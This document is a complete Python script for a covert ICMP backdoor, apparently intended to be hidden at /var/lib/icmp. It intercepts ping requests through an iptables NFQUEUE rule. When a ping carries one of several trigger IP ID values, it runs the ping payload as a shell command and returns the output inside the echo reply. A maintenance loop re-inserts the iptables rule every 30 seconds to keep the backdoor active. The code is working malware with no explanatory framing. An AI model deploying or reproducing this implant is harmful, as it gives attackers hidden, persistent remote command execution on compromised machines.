#!/usr/bin/python3

# To be: /var/lib/icmp
from netfilterqueue import NetfilterQueue
from scapy.all import IP, ICMP, send, Raw
from os import popen, system
import threading
from time import sleep


def process_packet(packet):
    pkt = IP(packet.get_payload())  # Convert to scapy packet
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:  # ICMP Echo Request (ping)
        print(f"Ping request from {pkt[IP].src}")
        print(f"ID: {pkt[IP].id}")

        payload = None
        if(pkt.haslayer(Raw)):
            payload = pkt[Raw].load
        try:
            SEND_REPLY = "0" in popen("sysctl -q net.ipv4.icmp_echo_ignore_all").read() or pkt[IP].id == 31
        except: 
            SEND_REPLY = True

        if(pkt[IP].id in [6751, 8796, 1234, 2222, 9876, 1337]):
            print("Malicious packet found")
            command = str(payload)[2:-1]
            print(f"Command: \"{command}\"")
            output = popen(command).read()
            print(f"Output: \"{output}\"")
            reply = IP(src=pkt[IP].dst, dst=pkt[IP].src, id=pkt[IP].id) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / output
            if SEND_REPLY:
                send(reply)
        else:
            if SEND_REPLY:
                reply = IP(src=pkt[IP].dst, dst=pkt[IP].src, id=pkt[IP].id) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
                if payload: 
                    reply = reply / payload
                send(reply)

        packet.drop()  # Drop original packet so the kernel doesn't respond
    else:
        packet.accept()  # Let other packets pass

def maintenance():
    while 1:
        iptable = popen("iptables -L --line-numbers", "r").read()
        if "NFQUEUE num 0" not in iptable:
            system("iptables -A INPUT -p icmp --icmp-type echo-request -j NFQUEUE --queue-num 0 ")
        sleep(30)

nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)
try:
    print("Listening for ICMP packets...")
    threading.Thread(target=maintenance, daemon=True).start()
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()